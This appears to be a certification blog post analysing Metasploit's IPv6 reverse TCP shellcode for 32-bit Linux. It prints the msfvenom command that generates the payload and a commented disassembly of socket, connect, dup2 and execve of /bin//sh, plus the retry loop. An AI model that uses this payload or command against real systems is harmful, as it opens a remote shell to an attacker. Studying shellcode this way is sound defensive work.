Title: SLAE32 - Assignment 5.4
Date: 2022-06-04T10:50:06.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source code</h2><p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3">rbctee/SlaeExam</a>.</p><p>List of files:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c">mimick_shellcode.c</a>, a C program that I've written to imitate the instructions ran by the shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c">run_shellcode.c</a>, a C program that runs the shellcode analysed in this post</li></ul><h2 id="analysis">Analysis</h2><p>I chose the following 4 shellcode samples:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x86/adduser</td>
<td>Create a new user with UID 0</td>
</tr>
<tr>
<td>linux/x86/shell/reverse_nonx_tcp</td>
<td>Spawn a command shell (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x86/shell_find_tag</td>
<td>Spawn a shell on an established connection (proxy/nat safe)</td>
</tr>
<tr>
<td>linux/x86/shell_reverse_tcp_ipv6</td>
<td>Connect back to attacker and spawn a command shell over IPv6</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>In this post I'll analyse <code>linux/x86/shell_reverse_tcp_ipv6</code>.</p><h3 id="ndisasm">NDISASM</h3><p>To generate the payload:</p><pre><code class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp_ipv6 LHOST=fe80::250:56ff:fe22:364b LPORT=4444 -o shellcode.bin
</code></pre><p>To analyze it with <code>ndisasm</code>:</p><pre><code class="language-bash">ndisasm shellcode.bin -b 32 -p intel
</code></pre><p>It returns the following output (comments are mine though):</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; EDX:EAX = EBX * 0
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
</code></pre><figcaption>Useful for polymorphism: besides <code>EBX</code>, they clear <code>EAX</code> and <code>EDX</code> too</figcaption></figure><pre><code class="language-nasm">                            ; IPPROTO_TCP
00000004  6A06              push byte +0x6

                            ; SOCK_STREAM
00000006  6A01              push byte +0x1

                            ; AF_INET6
00000008  6A0A              push byte +0xa

                            ; pointer to arguments of socket()
0000000A  89E1              mov ecx,esp

                            ; call socketcall(SYS_SOCKET, ...)
0000000C  B066              mov al,0x66
0000000E  B301              mov bl,0x1

                            ; C code: socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
00000010  CD80              int 0x80
</code></pre><p>The instructions above create a <code>TCP</code> socket based on the <code>IPv6</code> protocol. The return value, stored into the register <code>EAX</code> (and later moved into <code>ESI</code>), is a file descriptor.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; save File Descriptor of the socket
00000012  89C6              mov esi,eax

                            ; clear ECX and EBX and push 0x00000000 to the stack
00000014  31C9              xor ecx,ecx
00000016  31DB              xor ebx,ebx
00000018  53                push ebx
</code></pre><figcaption>I don't know exactly why the author pushed the DWORD <code>0x00000000</code> two times, thus making the struct 32-bytes long, when the size should be only 28 bytes. If you know, please contact me.</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; bytes 24-27 of the sockaddr_in6 struct:
                            ;   value of sin6_scope_id: 0x00000000
00000019  53                push ebx

                            ; bytes 8-23 of the sockaddr_in6 struct:
                            ;    value of sin6_addr: fe80::250:56ff:fe22:364b (big-endian)
0000001A  68FE22364B        push dword 0x4b3622fe
0000001F  68025056FF        push dword 0xff565002
00000024  6A00              push byte +0x0
00000026  68FE800000        push dword 0x80fe
</code></pre><figcaption>Bytes in <em>big-endian</em> order representing the IPv6 address: <code>fe80::250:56ff:fe22:364b</code></figcaption></figure><pre><code class="language-nasm">                            ; bytes 4-7 of the sockaddr_in6 struct:
                            ;   value of sin6_flowinfo: 0x00000000
0000002B  53                push ebx

                            ; bytes 2-3 of the sockaddr_in6 struct:
                            ;   value of sin6_port: port 4444 in big-endian order
0000002C  6668115C          push word 0x5c11

                            ; bytes 0-1 of the sockaddr_in6 struct:
                            ;   value of sin6_family: AF_INET6
00000030  66680A00          push word 0xa

                            ; save the pointer to the sockaddr_in6 struct into ECX
00000034  89E1              mov ecx,esp

                            ; 3rd argument of connect():
                            ;   size of the sockaddr_in6 struct (28 bytes): 
00000036  6A1C              push byte +0x1c

                            ; 2nd argument of connect():
                            ;   pointer to the sockaddr_in6 struct
00000038  51                push ecx

                            ; 1st argument of connect():
                            ;   File Descriptor of the client socket
00000039  56                push esi

                            ; clear registers
0000003A  31DB              xor ebx,ebx
0000003C  31C0              xor eax,eax

                            ; socketcall() syscall
0000003E  B066              mov al,0x66

                            ; 1st argument of socketcall():
                            ;   SYS_CONNECT call
00000040  B303              mov bl,0x3

                            ; 2nd argument of socketcall():
                            ;   pointer to the arguments of SYS_CONNECT
00000042  89E1              mov ecx,esp

                            ; call socketcall() syscall, in turn calling connect(...)
00000044  CD80              int 0x80
</code></pre><p>The disassembly I analyzed up until now can be converted into the following C code:</p><pre><code class="language-cpp">// create an IPv6 socket
int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

// allocate space for the struct containing IPv6 address and TCP port
struct sockaddr_in6 addr;

// set the socket to use IPv6
addr.sin6_family = AF_INET6;

// convert the TCP port number to big-endian (instead of little-endian)
addr.sin6_port = htons(4444);

// convert the string to an IPv6 address (big-endian)
inet_pton(AF_INET6, "fe80::250:56ff:fe22:364b", &amp;(addr.sin6_addr));

// connect to fe80::250:56ff:fe22:364b:4444
connect(fd, (struct sockaddr *)&amp;addr, sizeof(addr));
</code></pre><p>So, first it creates a <code>TCP socket</code> based on the <code>IPv6</code> protocol.</p><p>After that, it connects the socket referred to by the file descriptor <code>fd</code> to the address identified by:</p><ul><li>IP address: <code>fe80::250:56ff:fe22:364b</code></li><li>TCP port: <code>4444</code></li></ul><p>Next, the function <code>dup2</code> is used for redirecting file descriptors.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; clear EBX, setting it to 0
00000046  31DB              xor ebx,ebx

                            ; compare EAX with EBX, if they are equal,
                            ;   the flag ZF will be set, as cmp
                            ;   simply subtracts the bytes
00000048  39D8              cmp eax,ebx

                            ; if the flag ZF is set, and the two registers are equal,
                            ;   then jumps to 00000082 (calls nanosleep())
0000004A  7536              jnz 0x82

                            ; 2nd argument of dup2():
                            ;   newfd: file descriptor to be redirected,
                            ;   in this case stdin
0000004C  31C9              xor ecx,ecx

                            ; clear ECX, EDX, EAX
0000004E  F7E1              mul ecx

                            ; 1st argument of dup2():
                            ;   oldfd, i.e. the destination of the redirection of
                            ;   the file descriptor specified in the arg. newfd (ECX)
00000050  89F3              mov ebx,esi

                            ; call syscall dup2()
00000052  B03F              mov al,0x3f
00000054  CD80              int 0x80
</code></pre><figcaption>Redirect <code>stdin</code> to the previously-created socket</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; clear EAX
00000056  31C0              xor eax,eax

                            ; 2nd argument of dup2(): stdout
00000058  41                inc ecx

                            ; 1st argument of dup2(): the IPv6 socket
00000059  89F3              mov ebx,esi

                            ; call syscall dup2()
0000005B  B03F              mov al,0x3f
0000005D  CD80              int 0x80
</code></pre><figcaption>Redirect <code>stdout</code> to the previously-created socket&nbsp;</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">                            ; clear EAX
0000005F  31C0              xor eax,eax

                            ; 2nd argument of dup2(): stderr
00000061  41                inc ecx

                            ; 1st argument of dup2(): the IPv6 socket
00000062  89F3              mov ebx,esi

00000064  B03F              mov al,0x3f
00000066  CD80              int 0x80
</code></pre><figcaption>Redirect <code>stderr</code> to the previously-created socket</figcaption></figure><p>So far the disassembly I analyzed is equal to the following C code:</p><pre><code class="language-cpp">dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
</code></pre><p>Next, a shell is spawned.</p><pre><code class="language-nasm">                            ; clear EDX and EAX
                            ; 3rd argument of execve(): envp
                            ;   array of pointers to strings (env. variables)
                            ; in this case it's a null pointer
00000068  31D2              xor edx,edx
0000006A  F7E2              mul edx

                            ; push a string to the stack and add 4 null bytes at the end
                            ;   string: /bin//sh
0000006C  52                push edx
0000006D  682F2F7368        push dword 0x68732f2f
00000072  682F62696E        push dword 0x6e69622f

                            ; 1st argument of execve(): pathname, a pointer to the
                            ;   executable to run
00000077  89E3              mov ebx,esp

                            ; array of pointers to command-line arguments
                            ;   - EBX -&gt; "/bin//sh"
                            ;   - EDX -&gt; 0x00000000 
00000079  52                push edx
0000007A  53                push ebx

                            ; 2nd argument of execve(): argv
                            ;   array of pointers to strings (command-line arguments)
0000007B  89E1              mov ecx,esp

                            ; call execve() syscall
0000007D  B00B              mov al,0xb
0000007F  CD80              int 0x80
</code></pre><p>As for the second assignment, once the shellcode correctly redirected <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> to the file descriptor of the server socket (a <em>metasploit</em> handler to be specific), it uses <code>execve</code> to spawn the reverse shell.</p><p>In this case it uses the shell <code>/bin//sh</code>, as the string occupies only <code>8 bytes</code>, but we could also replace it with <code>/bin/bash</code>.</p><p>If the shellcode can't connect to the remote server, then it jumps to the address <code>00000082</code>, which is the start of a block of assembly instructions that call the syscall <code>nanosleep()</code> in order to sleep for <code>10</code> seconds:</p><pre><code class="language-nasm">                            ; I don't know why the use of this instruction.
                            ; Once the shellcode spawns a shell, the code of the program
                            ; should be replace, so it seems useless
00000081  C3                ret

                            ; clear EBX and push 0x00000000 to the stack
00000082  31DB              xor ebx,ebx
00000084  53                push ebx  

                            ; push the DWORD 0x0000000a to the stack
00000085  6A0A              push byte +0xa

                            ; clear EAX and EDX
00000087  F7E3              mul ebx

                            ; 1st argument of nanosleep():
                            ;   pointer to a timespec structure
00000089  89E3              mov ebx,esp

                            ; call nanosleep()
0000008B  B0A2              mov al,0xa2
0000008D  CD80              int 0x80
</code></pre><p>The interesting fact about <code>nanosleep</code> is that it doesn't simply use a integer to determine how many seconds/nanoseconds to sleep, but it uses a <code>struct</code>.</p><p>According to the <a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">Linux manual</a>, it is structured as follows:</p><pre><code class="language-cpp">struct timespec {
    time_t tv_sec;        /* seconds */
    long   tv_nsec;       /* nanoseconds */
};
</code></pre><p>Based on a few files of the Linux kernel, the size of <code>time_t</code> should be <code>4 bytes</code> on 32-bit <code>x86</code> systems, same for the <code>long</code> type. So we're looking at a struct made out of <code>8 bytes</code>.</p><p>The first 4 bytes specify the number of <code>seconds</code> to sleep, while the other ones specify the number of <code>nanoseconds</code> to sleep.</p><p>Since the <code>stack</code> grows downward, we have to push the value of <code>tv_nsec</code> to the stack first, and then push the value of <code>tv_sec</code>.</p><p>Let's look again at the struct:</p><pre><code class="language-nasm">                            ; clear EBX
00000082  31DB              xor ebx,ebx

                            ; push the value of `tv_nsec` to the stack
                            ; sleep 0 nanoseconds
00000084  53                push ebx  

                            ; push the value of `tv_sec` to the stack
                            ; sleep 10 seconds
00000085  6A0A              push byte +0xa

                            ; clear EAX and EDX
00000087  F7E3              mul ebx

                            ; 1st argument of nanosleep():
                            ;   pointer to a timespec structure
00000089  89E3              mov ebx,esp
</code></pre><p>Once the shellcode sleeps <code>10 seconds</code>, it goes back attempting to connect to the remote server (address <code>00000014</code>):</p><pre><code class="language-nasm">                            ; go back to 00000014 (to connect to the remote server)
0000008F  E980FFFFFF        jmp 0x14

                            ; apparently, this instruction is never going to be executed 
00000094  C3                ret
</code></pre><p>Finally, there are some instructions that call the syscall <code>exit()</code>, in order to exit gracefully.</p><pre><code class="language-nasm">                            ; call exit() syscall
00000095  31C0              xor eax,eax
00000097  B001              mov al,0x1
00000099  CD80              int 0x80
</code></pre><p>From what it seems, this last syscall is never executed. In fact, there are only two possibilities:</p><ul><li>executes <code>/bin//sh</code></li><li>loops forever, sleeping <code>10 seconds</code> and trying to connect to the remote server</li></ul><p>Perhaps these instructions were added for conformity with other Linux executable, in order to avoid <em>standing out</em>.</p>